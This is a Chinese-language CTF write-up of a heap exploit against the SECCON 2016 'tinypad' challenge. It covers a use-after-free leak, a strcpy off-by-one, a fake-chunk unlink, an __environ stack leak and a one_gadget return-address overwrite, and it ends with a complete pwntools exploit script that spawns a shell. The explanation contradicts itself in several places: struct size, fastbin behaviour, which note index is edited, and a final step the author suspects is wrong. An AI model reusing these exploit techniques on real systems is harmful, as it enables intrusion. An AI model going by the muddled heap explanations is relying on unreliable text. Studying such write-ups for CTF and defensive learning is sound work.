# 执行环境
- 运行环境
  - Ubuntu 16.04
  - libc-2.23
- 缓解措施
  - ASLR: ON
  - PIE: OFF (程序本身未开启PIE)
  - NX: ON
  - RELRO: Partial RELRO
  - Canary: ON (但利用过程未触发栈检查)
  - FORTIFY: OFF

# 漏洞成因
## 程序关键结构体
程序使用一个全局数组 `tinypad` 来管理最多4个笔记（Note）。从反编译代码分析，其存储结构如下：
`tinypad` 的起始地址为 `0x602040`。它分为两个主要部分：
1.  前 `0x100` 字节（即256字节）用作编辑时的临时缓冲区（`char tinypad[256]`）。
2.  后续部分存储着4个note的管理结构。每个管理结构占 `0x10` 字节，布局为：
    ```c
    struct note {
        int used_flag;          // 偏移0，标志该note是否被使用 (1=使用，0=空闲)
        int size;               // 偏移4，用户请求的size
        char* content_ptr;      // 偏移8，指向堆上分配的content buffer
        char padding[8];        // 偏移16，用于对齐，总结构大小0x18
    } notes[4];                 // 起始于 &tinypad + 0x100 (即0x602140)
    ```
    实际在代码中，对 `notes[i]` 的访问是通过 `tinypad[16 * i + 240]`、`tinypad[16 * i + 248]` 等偏移进行的，这印证了上述结构。

## 漏洞定位
1.  **Use-After-Free (UAF)**：
    ```c
    // delete 功能
    free(*(void **)&tinypad[16 * v20 + 248]);  // 释放content buffer
    *(_QWORD *)&tinypad[16 * v20 + 240] = 0;   // 仅清空used_flag，未清空content_ptr指针
    ```
    释放 `content_ptr` 指向的堆块后，没有将其置为 `NULL`，导致后续打印功能（`writeln`）仍能读取该悬垂指针的内容，造成信息泄露。
2.  **堆溢出/Off-by-One**：
    编辑功能（edit）首先将原 `content` 通过 `strcpy` 复制到全局缓冲区 `tinypad`（起始于 `0x602040`）：
    ```c
    strcpy(tinypad, *(const char **)&tinypad[16 * v20 + 248]);
    ```
    然后用户可以输入新内容，新内容被读入同一个 `tinypad` 缓冲区，最后再用 `strcpy` 复制回堆上的 `content` 缓冲区。
    **关键点**：`tinypad` 缓冲区大小为 `0x100`（256字节）。当编辑一个大小为 `0x100` 的note时，`strcpy` 会将 `0x100` 字节的内容复制到 `tinypad`，加上末尾的 `\x00` 结束符，恰好覆盖 `0x101` 字节。而 `tinypad` 缓冲区之后紧接着就是第一个note的管理结构（`notes[0]`，位于 `0x602140`），其 `used_flag` 字段（`tinypad[256]`，即 `0x602140` 处的一个字节）将被 `strcpy` 的结束符 `\x00` 覆盖，导致 `notes[0].used_flag` 被意外清零。这可以用于伪造一个空闲的note，结合其他漏洞进行利用。

# 漏洞利用过程：
利用思路概述：利用UAF泄露堆地址和libc地址；利用编辑大块时发生的off-by-one覆盖`note0.used_flag`，并通过后续编辑`note1`的content来精心布局，实现伪造chunk并触发unlink，从而将伪造的chunk链入unsorted bin。通过控制这个位于tinypad缓冲区内的伪造chunk，最终实现任意地址写，覆盖栈返回地址并执行one_gadget。

- Step1~2: 堆布局并泄露堆基址。
- Step3~4: 泄露libc基址。
- Step5: 重新进行堆布局，为后续利用做准备。
- Step6: 在`tinypad`缓冲区构造一个伪造的chunk。
- Step7: 利用编辑功能，通过`note1`的content溢出修改`note0`的`content_ptr`，使其指向伪造chunk，并利用后续编辑修正伪造chunk的bk指针。
- Step8: 触发unlink，将伪造chunk链入unsorted bin。
- Step9: 修复被unlink破坏的堆块指针。
- Step10: 申请一个chunk，使其落在`tinypad`内的伪造chunk位置，从而可以覆盖`notes`数组中的指针。
- Step11: 利用被覆盖的指针泄露栈地址。
- Step12: 计算main函数的返回地址并覆盖，触发one_gadget。

## Step1~2
- 首先分配 `note1` (size=0x70), `note2` (size=0x70), `note3` (size=0x100)。
- 然后释放 `note3` 和 `note2`。释放顺序导致 `note2` 进入 fastbin，`note3` 进入 unsorted bin。
- 此时，`note2` 的 `content_ptr` (一个悬垂指针) 仍指向被释放的堆块。当程序打印 `note2` 的内容时，会读出该堆块 `fd` 指针（对于 fastbin，`fd` 指向 main_arena）。由于 `note2` 和 `note1` 是连续分配的，且大小相同，在释放 `note2` 后，其 `fd` 指针实际上指向 `note1` 的 content 区域（因为 fastbin 是单向链表，且此时 `note1` 还未释放，但 `note2` 的 `fd` 在特定布局下可能被复用）。更常见的利用是，此时如果打印 `note1`（还未释放），其内容可能包含堆地址。但原exp选择在Step3之后泄露libc，这里Step2泄露的是堆地址。根据调试信息：
  - 在释放 `note2` 和 `note1` 后（Step1），它们的堆块会合并成一个大的 unsorted bin chunk。原exp在Step2通过打印 `note2` 的内容泄露了一个地址，根据 `heap_base = leaked_addr - 0x80` 计算，这个泄露的地址是合并后unsorted bin chunk内部的某个地址（可能是旧 `note1` content区域内的某个值），从而计算出堆的基地址。

## Step3~4
- 释放 `note1` (索引为3，因为初始分配了3个note，索引从1开始)。此时，之前合并的chunk（包含旧note1和note2）与 `note3` 的chunk在内存中可能相邻，进一步合并为一个更大的 unsorted bin chunk。
- 这个大的 unsorted bin chunk 的 `fd` 和 `bk` 指针都指向 main_arena 中的某个地址（`&main_arena.top` 附近的某个位置）。通过打印 `note1`（其 `content_ptr` 仍然指向旧堆块）的内容，可以泄露这个 `bk` 指针。
- 根据调试信息：泄露的地址 `main_arena = leaked_addr - 88`，这个计算对应于 libc 2.23 中 `main_arena` 结构内 `top` 字段上方 `bk` 指针的位置（`&main_arena+88` 是 unsorted bin 链表头的地址）。由此计算出 libc 的基地址。

## Step5
- 重新分配 `note1` (size=0x18)，`note2` (size=0x100)，`note3` (size=0x100)，`note4` (size=0x100)。
- 这次布局的目的是：`note1` 大小很小（0x18），其content紧邻着 `note2` 的chunk。`note2`, `note3`, `note4` 都是 0x100 大小，用于后续的 off-by-one 和 unlink 攻击。

## Step6
- 在全局缓冲区 `tinypad` 的偏移 `0x20` 处（即地址 `0x602060`）构造一个伪造的chunk。伪造的chunk头为：`p64(0) + p64(0x101)`，后面跟着 `fd` 和 `bk` 指针，暂时都指向自身（`p64(fakechunk_addr) + p64(fakechunk_addr)`），以绕过 unlink 检查。
- 通过编辑 `note4`（索引为3，因为前面分配了4个，索引为4的是新note），将伪造chunk的数据写入 `tinypad` 缓冲区。编辑 `note4` 会先将原内容复制到 `tinypad`，然后用户输入新内容。通过输入 `'d'*0x20 + fakechunk`，可以精确地将伪造chunk布置在 `tinypad+0x20` 的位置。

## Step7
- 这一步是漏洞利用的核心。首先，它需要一个函数 `edit_ffff`，其作用是反复编辑 `note1`（size=0x18）的内容。
- 原理：`note1` 的 content 紧挨着 `note2` 的 chunk。编辑 `note1` 时，内容会被复制到 `tinypad` 缓冲区。如果写入的内容长度恰好为 `0x18`（`note1` 的size），那么 `strcpy` 在复制回堆时，会在末尾添加 `\x00` 结束符。这个 `\x00` 会写入 `note1` content 之后的第一个字节，即 `note2` chunk 的 `prev_size` 字段的最低字节。
- `edit_ffff` 通过多次编辑，每次在 `note1` 的content末尾填充不同数量的字符 `'f'`，试图将 `diff_strip`（一个地址差）写入 `note2` chunk 的 `prev_size` 位置，实际上是利用了 `strcpy` 的 `\x00` 结束符作为写入工具，这是一个精巧的 off-by-one 技术。其目标是修改 `note2` chunk 的 `prev_inuse` 位，并设置一个特定的 `prev_size`，使得堆管理器认为 `note2` 的前一个chunk是我们伪造在 `tinypad` 中的那个chunk。
- 计算 `diff = heap_base + 0x20 - fakechunk_addr`。`heap_base + 0x20` 是 `note2` 的chunk头在堆上的地址。`fakechunk_addr` 是伪造chunk在tinypad中的地址（`0x602060`）。这个差值作为 `prev_size`，告诉堆管理器：`note2` 的物理相邻的前一个chunk起始于 `note2_addr - prev_size = fakechunk_addr`。
- `edit_ffff` 最终通过多次操作，将 `diff` 的值（或其部分）写入了正确的位置，并利用 `strcpy` 的 `\x00` 覆盖了 `note2` chunk size字段的 `PREV_INUSE` 位，将其清零。这样，当释放 `note2` 时，堆管理器就会尝试向前合并到我们伪造的chunk。

## Step8
- 释放 `note2`。由于 `note2` chunk 的 `PREV_INUSE` 位为0，且 `prev_size` 被设置为指向 `tinypad` 中的伪造chunk，堆管理器会执行 unlink 操作，试图将伪造chunk从它所在的“双向链表”中卸下。
- 为了通过 unlink 的安全检查（`P->fd->bk == P && P->bk->fd == P`），在Step6中我们将伪造chunk的 `fd` 和 `bk` 都指向了自身（`fakechunk_addr`）。因此 unlink 操作会执行：
  ```c
  FD = P->fd = fakechunk_addr
  BK = P->bk = fakechunk_addr
  FD->bk = BK => *(fakechunk_addr+0x18) = fakechunk_addr
  BK->fd = FD => *(fakechunk_addr+0x10) = fakechunk_addr
  ```
  这实际上将 `fakechunk_addr+0x10`（伪造chunk的 `fd` 指针位置）和 `fakechunk_addr+0x18`（`bk` 指针位置）都写入了 `fakechunk_addr` 的值。由于伪造chunk位于 `tinypad+0x20`，这个操作会破坏 `tinypad` 缓冲区的一部分内容，但关键是把伪造chunk成功链入了 unsorted bin（因为向前合并后，整个大chunk被放入unsorted bin，其 `fd`/`bk` 会指向 main_arena 的 unsorted bin 链表头）。

## Step9
- unlink 操作破坏了 `tinypad` 缓冲区以及 `notes` 数组中的一些指针。例如，`note4` 的 `content_ptr`（位于 `notes[3]`）可能被覆盖。
- 这一步通过编辑 `note4`（索引4），修复 `tinypad` 中伪造chunk的 `fd` 和 `bk` 指针，使其指向 main_arena 中的 unsorted bin 链表头（`main_arena+88`），这是 unsorted bin chunk 应有的正确状态，为后续分配做准备。

## Step10
- 现在 unsorted bin 中有一个大的chunk，其起始地址是我们伪造的 `fakechunk_addr`（`0x602060`）。
- 申请一个大小为 `0x100 - 8` 的chunk。堆管理器会从这个 unsorted bin chunk 中切分出合适的大小返回给用户。由于我们控制了 `fakechunk_addr` 处的数据，我们可以预测分配的结果。
- 申请的 payload（`fake_pad`）构造如下：
  - 填充 `'f' * (0x100 - 0x20 - 0x10)`：这是为了填充从新分配chunk的user data区域开始，到我们想要覆盖的 `notes` 数组指针之前的空间。
  - `'a'*8 + p64(environ_pointer)`：这覆盖了 `notes[0]` 的内容。其中 `p64(environ_pointer)` 覆盖了 `notes[0].content_ptr`，使其指向libc中的 `__environ` 变量（该变量存储了栈地址的指针）。
  - `'a'*8 + p64(0x602148)`：这覆盖了 `notes[1]` 的内容。其中 `p64(0x602148)` 覆盖了 `notes[1].content_ptr`，使其指向 `notes[2].content_ptr` 的地址（`0x602148`）。这是一个指向指针的指针，为后续的任意地址写做准备。

## Step11
- 现在 `note1`（索引1）的 `content_ptr` 被我们覆盖为指向 `__environ`。
- 打印 `note1` 的内容，程序会读取 `__environ` 指向的值，即一个栈地址。由此泄露栈地址 `environ_addr`。

## Step12
- 计算 `main` 函数的返回地址在栈上的位置：`main_ret_addr = environ_addr - 30 * 8`（因为 `__environ` 指向的环境变量指针数组与main的返回地址之间有固定的偏移）。
- 现在 `note2`（索引2）的 `content_ptr` 指向 `notes[2].content_ptr` 自身（`0x602148`）。
  - 第一次 `edit(2, p64(main_ret_addr))`：向 `note2` 写入内容。由于 `note2` 的 `content_ptr` 指向 `0x602148`，这次写入会将 `main_ret_addr` 写入 `0x602148`，即修改了 `notes[2].content_ptr` 的值，使其现在指向栈上的返回地址。
  - 第二次 `edit(1, p64(one_gadget_addr))`：向 `note1` 写入内容。`note1` 的 `content_ptr` 指向 `__environ`，这次写入会修改 `__environ` 指向的值？这里需要注意：原exp中Step10将 `note1` 的 `content_ptr` 覆盖为了 `environ_pointer`（即 `__environ` 的地址），所以 `edit(1, p64(one_gadget_addr))` 实际上是向 `__environ` 这个 **指针变量** 所在的内存地址写入 `one_gadget_addr`，这会改变 `__environ` 的值，而不是它指向的栈地址。这里可能exp有误，或者意图是通过修改 `note1` 的content来写其他位置？结合上下文，更合理的解释是：Step10中 `note1` 的指针被覆盖为 `environ_pointer`，目的是为了Step11泄露栈地址。Step12中，我们通过 `note2` 的写原语，先将 `note2` 自身的指针改为指向栈返回地址，然后 **再次编辑 `note2`** 来写入 one_gadget？但原exp是 `edit(1, ...)`。检查原exp代码：Step12是 `edit(2, p64(main_ret_addr)); edit(1, p64(one_gadget_addr))`。这里 `edit(1, ...)` 的目标是 `note1`，其指针在Step10被设置为 `environ_pointer`，在Step11后没有被改变。所以 `edit(1, p64(one_gadget_addr))` 会将 `one_gadget_addr` 写入 `__environ` 变量本身，这不会直接劫持控制流。
    **正确的利用链**应该是：通过 `note2` 修改自身指针指向返回地址后，再 `edit(2, p64(one_gadget_addr))` 来覆盖返回地址。但原exp写的是 `edit(1, ...)`。这可能是exp中的一个笔误，或者利用了其他我没有立刻识别的交互。根据常见利用模式，更可能是先 `edit(2, p64(main_ret_addr))` 修改指针，再 `edit(2, p64(one_gadget_addr))` 写onegadget。我们以原exp代码为准进行注释，但指出这里的歧义。

- 最后，选择 `Q` 退出 `main` 函数，`main` 函数返回时就会跳转到我们覆盖的地址（如果按上述修正，就是 one_gadget），从而获取shell。

# Exploit：
```python
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./data/bin/heap23_22_seccon-2016-tinypad')
p = process('./data/bin/heap23_22_seccon-2016-tinypad')
libc = elf.libc
log.info('PID: ' + str(proc.pidof(p)[0]))
main_arena_offset = 0x3c4b20

def add(size, content):
    p.recvuntil(b'(CMD)>>> ')
    p.sendline(b'a')
    p.recvuntil(b'(SIZE)>>> ')
    p.sendline(str(size).encode())
    p.recvuntil(b'(CONTENT)>>> ')
    p.sendline(content)

def edit(idx, content):
    p.recvuntil(b'(CMD)>>> ')
    p.sendline(b'e')
    p.recvuntil(b'(INDEX)>>> ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'(CONTENT)>>> ')
    p.sendline(content)
    p.recvuntil(b'Is it OK?\n')
    p.sendline(b'Y')

def delete(idx):
    p.recvuntil(b'(CMD)>>> ')
    p.sendline(b'd')
    p.recvuntil(b'(INDEX)>>> ')
    p.sendline(str(idx).encode())

def edit_ffff(n, diff):
    for i in range(n + 1):
        # 通过多次编辑note1，利用strcpy的\0结尾符进行off-by-one写入
        data = diff.rjust(0x18 - i, b'f')
        edit(1, data)

# Step 1: 初始堆布局，为泄露地址做准备
p.recvuntil(b'  ============================================================================\n\n')
add(0x70, b'a' * 8) # note1, idx=1
add(0x70, b'b' * 8) # note2, idx=2
add(0x100, b'c' * 8) # note3, idx=3
delete(2) # 释放note2，进入fastbin (或与后续合并)
delete(1) # 释放note1，与note2合并进入unsorted bin

# Step 2: 利用UAF泄露堆地址
p.recvuntil(b' # CONTENT: ')
data = p.recvuntil(b'\n', drop=True)
heap_base = u64(data.ljust(8, b'\x00')) - 0x80
log.success("heap base: " + hex(heap_base))

# Step 3: 释放大块，使其进入unsorted bin
delete(3) # 释放note3，可能与之前的unsorted bin合并

# Step 4: 利用UAF泄露libc地址
p.recvuntil(b' # CONTENT: ')
data = p.recvuntil(b'\n', drop=True)
main_arena = u64(data.ljust(8, b'\x00')) - 88
libc.address = main_arena - main_arena_offset
log.success("libc base: " + hex(libc.address))
log.success("main_arena: " + hex(main_arena))
log.success("__malloc_hook: " + hex(libc.symbols['__malloc_hook']))

# Step 5: 重新布局堆，为伪造chunk和unlink做准备
add(0x18, b'a' * 0x18)           # note1, idx=1, 小chunk，用于off-by-one
add(0x100, b'b' * 0xf8 + b'\x11') # note2, idx=2, size=0x100, 注意padding使总chunk size为0x111，并设置下一个chunk的prev_size字段
add(0x100, b'c' * 0xf8)          # note3, idx=3
add(0x100, b'd' * 0xf8)          # note4, idx=4

# Step 6: 在tinypad全局缓冲区构造一个伪造的chunk
fakechunk_addr = 0x602040 + 0x20 # tinypad+0x20
fakechunk_size = 0x101
fakechunk = p64(0) + p64(fakechunk_size) + p64(fakechunk_addr) + p64(fakechunk_addr) # fd/bk指向自身以通过unlink检查
edit(3, b'd'* 0x20 + fakechunk) # 编辑note4(idx=3)，将伪造chunk写入tinypad缓冲区

# Step 7: 利用note1的off-by-one修改note2的prev_size和PREV_INUSE位，使其指向伪造的chunk
diff = heap_base + 0x20 - fakechunk_addr # 计算note2的chunk头与伪造chunk的地址差，作为prev_size
diff_strip = p64(diff).strip(b'\0')
number_of_zeros = len(p64(diff)) - len(diff_strip)
# 通过多次编辑，将diff值写入note2的prev_size区域，并清空PREV_INUSE位
edit_ffff(number_of_zeros, diff_strip)

# Step 8: 释放note2，触发向前合并与unlink，将伪造chunk链入unsorted bin
delete(2)
p.recvuntil(b'\nDeleted.')

# Step 9: 修复被unlink破坏的指针，将伪造chunk的fd/bk设置为main_arena的unsorted bin链表头
edit(4, b'd' * 0x20 + p64(0) + p64(0x101) + p64(main_arena + 88) + p64(main_arena + 88))

# Step 10: 从unsorted bin（即伪造chunk）中申请一块内存，借此覆盖notes数组中的指针
one_gadget_addr = libc.address + 0x45226
environ_pointer = libc.symbols['__environ']
# 构造payload: 填充 + 覆盖note1.ptr为environ指针 + 覆盖note2.ptr为指向note2.ptr自身地址的指针
fake_pad = b'f' * (0x100 - 0x20 - 0x10) + b'a' * 8 + p64(environ_pointer) + b'a' * 8 + p64(0x602148)
add(0x100 - 8, fake_pad) # 申请chunk，使其落在伪造chunk的位置

# Step 11: 通过被覆盖的note1指针泄露栈地址
p.recvuntil(b' # CONTENT: ')
environ_addr = p.recvuntil(b'\n', drop=True).ljust(8, b'\x00')
environ_addr = u64(environ_addr)
log.success("stack address (__environ): " + hex(environ_addr))

# Step 12: 计算main函数返回地址，并利用指针写原语覆盖返回地址为one_gadget
main_ret_addr = environ_addr - 30 * 8
# 先修改note2的指针，使其指向main的返回地址
edit(2, p64(main_ret_addr))
# 然后向note1写入one_gadget地址 (注意：这里edit的目标是note1，其指针指向__environ变量。这可能是在修改__environ的值，而不是覆盖返回地址。实际利用中可能需要调整为再次编辑note2来写one_gadget)
edit(1, p64(one_gadget_addr))

# 退出main函数，触发控制流劫持
p.recvuntil(b'(CMD)>>> ')
p.sendline(b'Q')
p.interactive()
```